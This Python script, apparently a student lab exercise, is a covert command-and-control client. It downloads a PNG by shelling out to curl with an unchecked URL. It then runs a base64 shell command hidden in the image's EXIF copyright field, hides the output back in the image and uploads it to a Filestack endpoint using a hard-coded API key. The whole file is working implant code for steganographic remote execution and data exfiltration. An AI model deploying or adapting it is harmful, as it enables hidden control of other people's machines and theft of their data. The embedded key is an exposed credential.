# LB07 - Alfredo Thomas Novanski (2301924536)

import os, sys, base64, requests, subprocess
from os import path
from sys import argv
from exif import Image
from getopt import getopt

FILE = {"filename": path.basename(__file__)}

usage_text = (
	"Usage: \n"
	"\t%(filename)s -u <URL>"
) % FILE

URL = ''

def client_execute():
	try:
		os.system("curl {} -o cute_lulu.png".format(URL))
	except Exception:
		print("Error")
	print("[!] Image Downloaded")

	with open('cute_lulu.png', 'rb') as img:
		image = Image(img)

	check_payload = base64.b64decode(image.copyright).decode()
	execute_payload = subprocess.Popen(check_payload, stdout=subprocess.PIPE, shell=True).stdout.read()
	image.copyright = base64.b64encode(execute_payload).decode()
	with open('cute_lulu2.png', 'wb') as final_image:
		final_image.write(image.get_file())

	result = open('cute_lulu2.png', 'rb').read()
	headers = {
		'Content-Type': 'image/png'
	}
	post_image = requests.post('https://www.filestackapi.com/api/store/S3?key=AEcmlgqRHRdGOHqea5HRRz', data=result, headers=headers)
	response = post_image.json()['url']
	print("[!] Image URL: " + response)

def main():
	global URL

	cmd_args, gopt = getopt(argv[1:], "u:", ["url="])
	if not cmd_args:
		print(usage_text)
		sys.exit()

	for opt, val in cmd_args:
		if(opt in ["-u", "--url"]):
			URL = val
	client_execute()

if __name__ == "__main__":
	main()